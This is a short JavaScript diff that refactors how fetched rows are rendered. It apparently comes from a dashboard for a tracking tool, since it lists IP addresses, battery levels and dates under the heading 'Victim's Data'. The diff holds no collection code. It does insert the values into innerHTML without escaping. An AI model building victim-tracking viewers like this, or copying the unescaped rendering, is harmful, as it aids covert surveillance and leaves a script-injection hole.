@@ -11,19 +11,21 @@ const fetchData = async () => {
 
         const result = await response.json();
 
-        // const data = result.rows
+        let html = "";
+
         for (let i = 0; i < result.rows.length; i++) {
             const row = result.rows[i];
-            console.log(row);
-            
-            container.innerHTML += 
-            ` <ul> 
-                <h3>Victim's Data</h3>
-                <li>ip: ${row.ip}</li> 
-                <li>battery: ${row.battery_percentage}</li> 
-                <li>date: ${row.date}</li> 
-            </ul> `
+
+            html += `
+                <ul> 
+                    <h3>Victim's Data</h3>
+                    <li>ip: ${row.ip}</li> 
+                    <li>battery: ${row.battery_percentage}</li> 
+                    <li>date: ${row.date}</li> 
+                </ul>`;
         }
+
+        container.innerHTML = html;
 
 
     } catch (error) {
